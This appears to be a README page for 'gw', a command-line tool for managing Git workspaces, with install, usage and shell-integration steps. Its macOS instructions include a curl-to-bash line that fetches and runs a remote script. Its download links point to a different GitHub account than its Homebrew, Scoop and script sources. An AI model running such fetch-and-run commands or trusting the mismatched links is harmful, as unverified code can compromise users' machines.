---
layout: "default"
title: "🌟 gw - Simplify Your Git Workflow"
description: "🛠️ Manage your Git workspaces effortlessly with gw, a cross-platform CLI that simplifies multi-agent and parallel work tasks."
---
# 🌟 gw - Simplify Your Git Workflow

[![Download gw](https://img.shields.io/badge/Download-gw-blue.svg)](https://github.com/DuongDucToan01/gw/releases)

## 🚀 Getting Started

gw is a cross-platform command-line tool that simplifies managing your Git workspaces. With gw, you can handle multiple tasks efficiently without getting lost in commands. Follow these simple steps to get started.

## 📥 Download & Install

To install gw, follow these guidelines based on your operating system.

### macOS

* **Homebrew**: Open your terminal and run:

  ```bash
  brew install golbin/tap/gw
  ```

* **Install Script**: Alternatively, run the following command:

  ```bash
  curl -fsSL https://raw.githubusercontent.com/golbin/gw/main/install.sh | bash
  ```

### Windows

* **Scoop**: If you're using Scoop, add the repository and install gw by running:

  ```powershell
  scoop bucket add golbin https://github.com/golbin/scoop-bucket
  scoop install gw
  ```

### Download Link

For all versions, visit [this page to download gw](https://github.com/DuongDucToan01/gw/releases) and select the appropriate file for your system.

## ⚡ Quick Start

Once you have installed gw, you can start using it right away. Here’s a simple workflow to help you get started:

1. Create a new workspace:

   ```bash
   gw add demo
   ```

2. Navigate to the new workspace:

   ```bash
   gw cd demo
   ```

3. Create a new file:

   ```bash
   touch demo.md
   ```

4. Check the status of your workspace:

   ```bash
   gw status
   ```

5. Apply changes:

   ```bash
   gw apply demo
   ```

### Tip

Jump to the root of your repository quickly by using the command:

```bash
gw cd
```

## 🧭 Common Navigation

Here are some useful commands for navigating your workspaces:

```bash
gw cd root
gw cd <name>
```

Replace `<name>` with the name of your workspace. 

## 🌐 Shell Integration (Recommended)

For a smoother experience, configure shell integration so that the `gw cd` command changes your current directory automatically. This integration works with various shells without prompting you for setup.

Run:

```bash
gw shell-init --install
```

If you want to make this fully automatic during your current session, use:

```bash
eval "$(gw shell-init)"
```

To view the integration script without installing, run:

```bash
gw shell-init <shell>
```

Replace `<shell>` with `bash` or `zsh` as needed.

## 🌟 Features

- **Cross-Platform**: Works on macOS, Windows, and Linux.
- **Multi-Agent Support**: Perfect for managing parallel tasks.
- **Easy Navigation**: Simplified commands to switch between workspaces.
- **Shell Integration**: Seamless directory changes within your shell.
- **Active Development**: Regular updates to improve performance and add more features.

## 💡 Use Cases

- **Project Management**: Use gw to handle different features or bug fixes in isolated workspaces.
- **Collaborative Development**: Developers can work on separate tasks simultaneously without conflicts.
- **Backup and Recovery**: Easily switch back to previous versions of your projects.
  
## 🛠 Troubleshooting

If you face issues during installation or while using gw, here are some common solutions:

- Ensure that your terminal is up to date.
- Verify that you have the latest version of Git installed.
- Check your internet connection if installation fails.

For more help, visit [our GitHub Issues page](https://github.com/DuongDucToan01/gw/issues).

## 📞 Support

If you have questions or need assistance, please reach out. You can create an issue on the GitHub repository, and we'll get back to you as soon as we can.

## 🔗 Additional Resources

- [Official Documentation](https://github.com/DuongDucToan01/gw) - Explore in-depth usage instructions.
- [Community Forum](https://github.com/DuongDucToan01/gw/discussions) - Join discussions, ask questions, and share ideas.

Enjoy using gw for a simpler and more organized Git workflow. Visit [this page to download gw](https://github.com/DuongDucToan01/gw/releases) and start today!